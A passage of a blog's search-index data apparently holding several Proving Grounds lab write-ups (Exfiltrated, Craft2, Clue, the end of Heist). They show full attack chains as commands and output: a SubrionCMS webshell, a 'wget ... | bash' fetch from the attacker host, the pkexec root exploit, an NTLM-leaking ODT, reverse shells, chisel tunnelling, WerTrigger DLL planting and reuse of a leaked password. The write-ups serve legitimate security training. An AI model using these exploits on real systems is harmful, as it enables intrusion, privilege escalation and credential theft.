group, Enabled by default, Enabled groupEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeMachineAccountPrivilege Add workstations to domain EnabledSeRestorePrivilege Restore files and directories EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.*Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents> cd ..tree *Evil-WinRM* PS C:\\Users\\svc_apac*Evil-WinRM* PS C:\\Users\\svc_apache$> tree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---Desktop+---Documents| EnableSeRestorePrivilege.ps1|+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\svc_apache$>```{: .nolineno}Now I got the privileges as SeRestorePrivilege as Enabled so lets abuse that ðŸ”»![Image](Pasted%20image%2020240617005222.png)I found some exploitable binaries and steps to abuse that like ðŸ”» â© https://github.com/xct/SeRestoreAbuseyou can download the executable file from here â© https://github.com/dxnboy/redteam![Image](Pasted%20image%2020240617004952.png)```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Heist]â””â”€$ rlwrap nc -lvnp 443 listening on [any] 443 ...connect to [192.168.45.214] from (UNKNOWN) [192.168.182.165] 50382Microsoft Windows [Version 10.0.17763.2061](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd C:\\USers\\Administratorcd C:\\USers\\AdministratorC:\\Users\\Administrator>C:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---3D Objects+---Contacts+---Desktop| proof.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\proof.txttype Desktop\\proof.txt0f779d97304b35d84f8fa7b0d3648406C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Exfiltration", "url": "/posts/Exfiltration/", "categories": "Proving Grounds, Practice", "tags": "pkexec, CMS, subrion, Public Exploit, default_creds", "date": "2024-09-03 00:00:00 +0530", "snippet": "| Machine Link | https://tryhackme.com/room/set || ------------------ | -------------------------------------------- || Operating System | Windows ...", "content": "| Machine Link | https://tryhackme.com/room/set || ------------------ | -------------------------------------------- || Operating System | Windows || Difficulty | Hard || Machine Created by | [4ndr34zz](https://tryhackme.com/p/4ndr34zz) |## Port Scan Results â¤µï¸```bash```{: .nolineno}## Web Enumeration â¤µï¸![Image](Pasted%20image%2020240611111807.png)![Image](Pasted%20image%2020240611111836.png)with default creds file admin : admin I got administrators login ðŸ”»![Image](Pasted%20image%2020240611111935.png)### Exploit Usage â¤µï¸https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE/tree/main```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Exfiltrated]â””â”€$ python3 exploit.py -u http://exfiltrated.offsec/panel/ -l admin -p admin[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 [+] Trying to connect to: http://exfiltrated.offsec/panel/[+] Success![+] Got CSRF token: dbdBd1q5Oa501bIx1p24T44TnS0UdOgA2mzUdOzG[+] Trying to log in...wget http://192.168.45.1616^[[2~[+] Login Successful![+] Generating random name for Webshell...[+] Generated webshell name: eutwjgithrbhgym[+] Trying to Upload Webshell..[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/eutwjgithrbhgym.phar $ wget http://192.168.45.161/rev.sh | bash$ lseutwjgithrbhgym.pharewoyjlsedzraleo.pharrev.sh$ ./rev.sh$ sh rev.sh```{: .nolineno}```bashwww-data@exfiltrated:/var/www/html/subrion/admin$ sudo -Vsudo -VSudo version 1.8.31Sudoers policy plugin version 1.8.31Sudoers file grammar version 46Sudoers I/O plugin version 1.8.31www-data@exfiltrated:/var/www/html/subrion/admin$ /usr/bin/pkexec --version/usr/bin/pkexec --versionpkexec version 0.105www-data@exfiltrated:/var/www/html/subrion/admin$ cd /tmpcd /tmpwww-data@exfiltrated:/tmp$ lslswww-data@exfiltrated:/tmp$ wget http://192.168.45.161/pkexec_CVE-2021-4034.pywget http://192.168.45.161/pkexec_CVE-2021-4034.py--2024-06-11 05:43:38-- http://192.168.45.161/pkexec_CVE-2021-4034.pyConnecting to 192.168.45.161:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3067 (3.0K) [text/x-python]Saving to: â€˜pkexec_CVE-2021-4034.pyâ€™pkexec_CVE-2021-403 100%[===================>] 3.00K --.-KB/s in 0.03s 2024-06-11 05:43:38 (102 KB/s) - â€˜pkexec_CVE-2021-4034.pyâ€™ saved [3067/3067]www-data@exfiltrated:/tmp$ chmod +x pk\tchmod +x pkexec_CVE-2021-4034.py www-data@exfiltrated:/tmp$ python3 pkexec_CVE-2021-4034.pypython3 pkexec_CVE-2021-4034.pyDo you want to choose a custom payload? y/n (n use default payload) [+] Cleaning pervious exploiting attempt (if exist)[+] Creating shared library for exploit code.[+] Finding a libc library to call execve[+] Found a library at [+] Call execve() with chosen payload[+] Enjoy your root shell# whoamiwhoamiroot# cd /rootcd /root# ls -alls -altotal 28drwx------ 4 root root 4096 Jun 11 05:24 .drwxr-xr-x 20 root root 4096 Jan 7 2021 ..lrwxrwxrwx 1 root root 9 Jun 10 2021 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwx------ 2 root root 4096 Jan 7 2021 .ssh-rwx------ 1 root root 33 Jun 11 05:24 proof.txtdrwxr-xr-x 3 root root 4096 Jan 7 2021 snap# cat proof\tcat proof\tcat: proof: No such file or directory# cat proof.txtcat proof.txtdb0eaa7f647cd07d2a8b9b4f10322a14# cd /homecd /home# ls -alls -altotal 12drwxr-xr-x 3 root root 4096 Jun 10 2021 .drwxr-xr-x 20 root root 4096 Jan 7 2021 ..drwx--x--x 2 coaran coaran 4096 Jun 10 2021 coaran# cd coarancd coaran# ls -alls -altotal 24drwx--x--x 2 coaran coaran 4096 Jun 10 2021 .drwxr-xr-x 3 root root 4096 Jun 10 2021 ..lrwxrwxrwx 1 root root 9 Jun 10 2021 .bash_history -> /dev/null-rw-r--r-- 1 coaran coaran 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 coaran coaran 3771 Feb 25 2020 .bashrc-rw-r--r-- 1 coaran coaran 807 Feb 25 2020 .profile-rwxr--r-- 1 coaran coaran 33 Jun 11 05:24 local.txt# cat local.txtcat local.txte5fb28077f505fb52883ba4deb73dc32# ```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Craft2", "url": "/posts/Craft2/", "categories": "Proving Grounds, Practice", "tags": "Windows, mysql, SMB, odt, WerTrigger, Privileged_File_Write, Port Forwarding, chisel, File Upload, Public Exploit", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.182.188Not shown: 65531 filtered tcp port...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.182.188Not shown: 65531 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA|_http-title: Craft135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC445/tcp open microsoft-ds? syn-ack ttl 12549666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 55455/tcp): CLEAN (Timeout)| Check 2 (port 22756/tcp): CLEAN (Timeout)| Check 3 (port 31536/udp): CLEAN (Timeout)| Check 4 (port 65003/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb2-time: | date: 2024-06-15T16:41:05|_ start_date: N/A|_clock-skew: 0s```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and set the host file names as `craft.offsec` and I got that hint through checking the email on this website while checking the contact page ðŸ”»![Image](Pasted%20image%2020240616110437.png)There is one Resume upload functionality that takes file as input so I randomly choose a file to see its reaction I got this ðŸ”»![Image](Pasted%20image%2020240616155105.png)That means I need to find a payload that will be in `odt` extension.I got this exploit from the web enumeration ðŸ”½https://raw.githubusercontent.com/rmdavy/badodf/master/badodt.pyThat will generate a payload in `.odt `format along with it need an attackers IP address that will be triggered when upload and the response will be outputted through responder Tool ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ python3 badodt.py ____ __ ____ ____ ______ / __ )____ _____/ / / __ \\/ __ \\/ ____/ / __ / __ `/ __ /_____/ / / / / / / /_ / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/ /_____/\\__,_/\\__,_/ \\____/_____/_/ Create a malicious ODF document help leak NetNTLM CredsBy Richard Davy @rd_pentestPython3 version by @gustaniniwww.secureyourit.co.ukPlease enter IP of listener: 192.168.45.214/home/kali/Downloads/Proving_Ground/Practice/Craft2/bad.odt successfully created```{: .nolineno}Lets upload our bad.odt file that will trigger afterwards.![Image](Pasted%20image%2020240616105840.png)![Image](Pasted%20image%2020240616105901.png)Now According to the exploit I need to start the responder for the response capture ðŸ”»![Image](Pasted%20image%2020240616105518.png)![Image](Pasted%20image%2020240616105655.png)I got the SMB access to that web file directory so I can directly insert the reverse shell file to get the reverse shell ðŸ”»![Image](Pasted%20image%2020240616110244.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ smbclient //192.168.182.188/WebApp -U thecybergeekPassword for [WORKGROUP\\thecybergeek]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Tue Apr 5 21:46:03 2022 .. D 0 Tue Apr 5 21:46:03 2022 assets D 0 Tue Apr 5 21:46:03 2022 css D 0 Tue Apr 5 21:46:03 2022 index.php A 9768 Mon Jan 31 21:51:52 2022 js D 0 Tue Apr 5 21:46:03 2022 upload.php A 896 Mon Jan 31 20:53:02 2022 uploads D 0 Tue Apr 5 21:46:03 2022\t\t10327807 blocks of size 4096. 1579321 blocks availablesmb: \\> put php_reverse_shell.phpputting file php_reverse_shell.php as \\Report.wer (31.4 kb/s) (average 31.4 kb/s)smb: \\>```{: .nolineno}Lets have a shell now ðŸ”»```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [192.168.45.214] from (UNKNOWN) [192.168.182.188] 49704SOCKET: Shell has connected! PID: 4140Microsoft Windows [Version 10.0.17763.2746](c) 2018 Microsoft Corporation. All rights reserved.C:\\xampp\\htdocs>whoamicraft2\\apacheC:\\xampp\\htdocs>hostnameCRAFT2C:\\xampp\\htdocs>whoami /allUSER INFORMATION----------------User Name SID ============= =====================================craft2\\apache S-1-5-21-537427935-490066102-1511301751-1000GROUP INFORMATION-----------------Group Name Type SID Attributes ==================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ============================== =SeChangeNotifyPrivilege Bypass traverse checking Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledC:\\xampp\\htdocs>```{: .nolineno}Now I checked the internal running services ports and found mysql running so lets user chisel to port forward it and access it externally too ðŸ”½![Image](Pasted%20image%2020240616153248.png)I setup the server on the attacker machine on port 8000 ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ /opt/Tools/chisel server --port 8000 --reverse2024/06/16 11:16:17 server: Reverse tunnelling enabled2024/06/16 11:16:17 server: Fingerprint FBkf86aPjEYyeLSorebi4DmA4fyAw5ZoWqWNi7mWvyc=2024/06/16 11:16:17 server: Listening on http://0.0.0.0:80002024/06/16 11:17:14 server: session#1: Client version (1.9.1) differs from server version (1.7.7)2024/06/16 11:17:14 server: session#1: tun: proxy#R:3306=>3306: Listening```{: .nolineno}Lets start the client mode also through the machine on port 3306 which is for mysql service ðŸ”»```powershellC:\\xampp\\htdocs>chisel.exe client 192.168.45.214:8000 R:3306:127.0.0.1:33062024/06/15 22:47:13 client: Connecting to ws://192.168.45.214:80002024/06/15 22:47:14 client: Connected (Latency 97.9039ms)```{: .nolineno}Lets check with nmap connection is it connected or not ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ sudo nmap -p 3306 127.0.0.1 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 15:23 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.000067s latency).PORT STATE SERVICE3306/tcp open mysqlNmap done: 1 IP address (1 host up) scanned in 0.18 seconds```{: .nolineno}**Here I will be using an Escalation Privilege process that will be executed through File write** ðŸ”»### WerTrigger> Exploit Privileged File Writes bugs with Windows Problem Reporting{: .prompt-tips }1. Clone https://github.com/sailay1996/WerTrigger2. CopyÂ `phoneinfo.dll`Â toÂ `C:\\Windows\\System32\\`3. PlaceÂ `Report.wer`Â file andÂ `WerTrigger.exe`Â in a same directory.4. Then, runÂ `WerTrigger.exe`.5. Enjoy a shell asÂ **NT AUTHORITY\\SYSTEM**Reference : [EoP](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/?source=post_page-----7527b7171183--------------------------------#wertrigger)Now the main problem was to transfer the content of phoneinfo.dll into C:\\windows32\\system32 location , How can I do that ?So that problem will be solved through mysql , Yes Mysql can transfer the file from one location to another but can't rewrite the files through this query ðŸ”»```sqlSELECT LOAD_FILE('C:\\\\\\\\xampp\\\\htdocs\\\\abc.dll') INTO DUMPFILE 'C:\\\\Windows\\\\System32\\\\abc.dll';```{: .nolineno}Lets connect to mysql through default creds that is root : ' ' ðŸ”»```sqlâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ mysql -h 127.0.0.1 -u root -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 8Server version: 10.4.19-MariaDB mariadb.org binary distributionCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Support MariaDB developers by giving a star at https://github.com/MariaDB/serverType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]>MariaDB [(none)]> SELECT LOAD_FILE('C:\\\\\\\\xampp\\\\htdocs\\\\phoneinfo.dll') INTO DUMPFILE 'C:\\\\Windows\\\\System32\\\\phoneinfo.dll';Query OK, 1 row affected (0.123 sec)MariaDB [(none)]>```{: .nolineno}I think I did it , I actually transfred the file into that location .Now as the exploit said that the Report.wer file and the WerTrigger.exe file should be in a directory so lets transfer those through SMB share only.Now lets trigger WerTrigger.exe file to get a call back on listener port 443 ðŸ”»```powershellC:\\xampp\\htdocs>.\\WerTrigger.exe[+] Windows Error Reporting Trigger by @404death ![+] Trigger launched.[*] TCP connecting...[*] Waiting for the DLL to be loaded...[-] Unable to connect to server![*] Retrying ...[-] Unable to connect to server![*] Retrying ...[-] Unable to connect to server![-] Exploit failed.C:\\xampp\\htdocs>```{: .nolineno}I received the reverse shell on port 443 as planed ðŸ”»```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Craft2]â””â”€$ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [192.168.45.214] from (UNKNOWN) [192.168.182.188] 49693Microsoft Windows [Version 10.0.17763.2746](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd C:\\Users\\cd C:\\Users\\C:\\Users>cd Administratorcd AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---3D Objects+---Contacts+---Desktop| proof.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\proof.txttype Desktop\\proof.txt1d0555b8e7cada8418ea9e7c2b479837C:\\Users\\Administrator>C:\\Users\\Administrator>ipconfigipconfigWindows IP ConfigurationEthernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 192.168.182.188 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.182.254C:\\Users\\Administrator>hostnamehostnameCRAFT2C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Clue", "url": "/posts/Clue/", "categories": "Proving Grounds, Practice", "tags": "LFI, PrivEsc, Public Exploit, FreeSWITCH, Cassandra Web, Recon", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Clue]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt 192.168.246.240Nmap scan report for 192.168.246.240Host...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Clue]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt 192.168.246.240Nmap scan report for 192.168.246.240Host is up, received echo-reply ttl 61 (0.10s latency).Scanned at 2024-06-25 12:59:23 IST for 276sNot shown: 65529 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r| 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=| 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache/2.4.38 (Debian)|_http-title: 403 Forbidden139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)3000/tcp open http syn-ack ttl 61 Thin httpd|_http-server-header: thin| http-methods: |_ Supported Methods: GET HEAD|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8|_http-title: Cassandra Web8021/tcp open freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socketService Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian)| Computer name: clue| NetBIOS computer name: CLUE\\x00| Domain name: pg| FQDN: clue.pg|_ System time: 2024-06-25T03:33:24-04:00| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 36040/tcp): CLEAN (Timeout)| Check 2 (port 17908/tcp): CLEAN (Timeout)| Check 3 (port 30141/udp): CLEAN (Timeout)| Check 4 (port 42989/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_clock-skew: mean: 1h20m01s, deviation: 2h18m37s, median: 0s| smb2-time: | date: 2024-06-25T07:33:21|_ start_date: N/A```{: .nolineno}## SMB Enumeration â¤µï¸With tool netexec I got these shares with no creds ðŸ”»![Image](Pasted%20image%2020240626224832.png)_Netexec SMB Shares_I accessed all the content and downloaded into the attacker machine from smbclient with these command `recurse on; prompt off; mget *`![Image](Pasted%20image%2020240626225149.png)_Downloaded all the data from smbclient to attacker machine_## Web Enumeration â¤µï¸I got this CMS cassandra web page from port 3000 ðŸ”»![Image](Pasted%20image%2020240626222159.png)_Cassandra Web Dashboard_I enumerated further on internet and got an exploit related to `cassandra web` that reads file contents ðŸ”»https://www.exploit-db.com/exploits/49362First I tried to access the passwd file ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Clue]â””â”€$ python3 49362.py 192.168.225.240 /etc/passwd root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinntp:x:106:113::/nonexistent:/usr/sbin/nologincassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologincassie:x:1000:1000::/home/cassie:/bin/bashfreeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/falseanthony:x:1001:1001::/home/anthony:/bin/bash```{: .nolineno}Lets Follow the exploit and it said to access this file to get some creds ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Clue]â””â”€$ python3 49362.py 192.168.246.240 /proc/self/cmdline /usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330```{: .nolineno}From port scan I also noticed the `FreeSwitch` port open and I recon online and found this exploit ðŸ”»[FreeSWITCH 1.10.1 - Command Execution](https://www.exploit-db.com/exploits/47799)In order to use this exploit I need to have a correct password of this FreeSwitch service and for that I enumerated further on the files that I got from SMB service and searched for password in that freeswitch directory and so this hint file like this ðŸ”»```bashgrep -R password .```{: .nolineno}I got this file and this content like this ðŸ”»```bash./etc/freeswitch/autoload_configs/event_socket.conf.xml: ```{: .nolineno}I knew that the default password is `ClueCon` as it is also mentioned in the exploit too so I need to read this file from the machine in order to get the password of freeswitch service.I now used the *Read file exploit from cassandra web* and got this content along with the password ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Clue]â””â”€$ python3 49362.py -p 3000 192.168.246.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml ```{: .nolineno}Now lets try that exploit with simple `id` command ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Clue]â””â”€$ python3 freeswitch_exploit.py 192.168.246.240 id AuthenticatedContent-Type: api/responseContent-Length: 63uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)```{: .nolineno}I got the command execution working so lets have a shell now , as I was using the nc simple reverse shell command but I could not able to get the shell , I also used so many other reverse shell command from { python, nc ,bash ,awk } but they did not worked .Now I was fustrated and after a while I try to change the reverse shell port from 4444 to 80 and I got the shell , What the f*\\*k !!![Image](Pasted%20image%2020240626222635.png)_Reverse shell on port 80_Lets change the user to `cassie` as it has higher privileges and as A password I will be using the password as I got from the *READ file Exploit of cassandra web* .```bashfreeswitch@clue:/$ su cassiesu cassiePassword: SecondBiteTheApple330cassie@clue:/$ whoamiwhoamicassiecassie@clue:/$ ididuid=1000(cassie) gid=1000(cassie) groups=1000(cassie)cassie@clue:/$ sudo -lsudo -lMatching Defaults entries for cassie on clue: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser cassie may run the following commands on clue: (ALL) NOPASSWD: /usr/local/bin/cassandra-webcassie@clue:/$ ```{: .nolineno}Lets run this command with port 4444 as 3000 is already running with this service only and with the `cassie` creds ðŸ”»```bashcassie@clue:/$ sudo /usr/local/bin/cassandra-web -B localhost:4444 --username 'cassie' --password 'SecondBiteTheApple330' /dev/null-rw-r--r-- 1 root root 595 Oct 27 2020 .bashrcdrwxr-xr-x 2 root root 4096 Aug 5 2022 .cassandradrwxr-xr-x 3 root root 4096 Aug 5 2022 .gem-rw-r--r-- 1 root root 27 Aug 5 2022 .gemrcdrwx------ 3 root root 4096 Aug 11 2022 .gnupgdrwxr-xr-x 3 root root 4096 Oct 27 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 29 Aug 5 2022 proof.txt-rw------- 1 root root 33 Jun 28 00:04 proof_youtriedharder.txt-rwxr-xr-x 1 root root 223 Apr 29 18:13 smbd.shdrwxr-xr-x 2 root root 4096 Aug 5 2022 